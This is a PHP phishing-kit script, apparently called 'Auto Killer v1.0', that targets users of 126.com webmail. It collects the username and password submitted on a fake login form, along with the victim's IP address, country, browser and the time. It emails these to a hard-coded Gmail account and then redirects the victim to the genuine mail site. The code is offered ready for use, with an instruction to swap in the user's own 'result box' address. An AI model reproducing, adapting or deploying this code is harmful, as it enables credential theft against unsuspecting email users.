<?
 /*
 
 # HELLION PROUDLY PRESENTS, Auto Killer v1.0
 
 # This program is free software brought to you by Hellion: 
 # You can redistribute it and/or modify it under the terms of 
 # the GNU General Public License as published by the Free Software Foundation, 
 # either version 3 of the License, or (at your option) any later version.
 
 # However, the license header, copyright and author credits 
 # must not be modified in any form and always be displayed.

 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 # Contact me : alibabareloaded@gmail.com for more details.
 
 # Skype: teamipwned

 # Special greets to Shaif Lifax, Solaree, PaperBoi, Softwarewind, Emoney, and others who helped! 
 
 # Edit line 53, remove "alibabareloaded@gmail.com" and include your result box!
 
  */
$password = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message  =     "=============+[ User Info ]+==============\n";
$message .=     "Username : ".$_POST['username']."\n";
$message .=     "Password : ".$_POST['password']."\n";
$message .=     "=============+[ Loc Info ]+===============\n";
$message .=     "IP: ".$ip."\n";
$message .=     "=======================================\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .=     "=======================================\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .=     "=======================================\n";
$message .= 	"User-Agent: ".$browser."\n";
$message .=     "=======================================\n";
$message .=     "Date  & Time Log  : ".$adddate."\n";
$message .=     "=======================================\n";

$sniper = '126.COM';
$who_be_the_boss = 'Hellion [...........]';
$subj = "$sniper Login $ip $adddate\n";
$from = "From: $who_be_the_boss <west>\n";
mail("profeldonking2@gmail.com",$subj,$message,$from,$sniper);

header("Location: http://mail.126.com/");

?>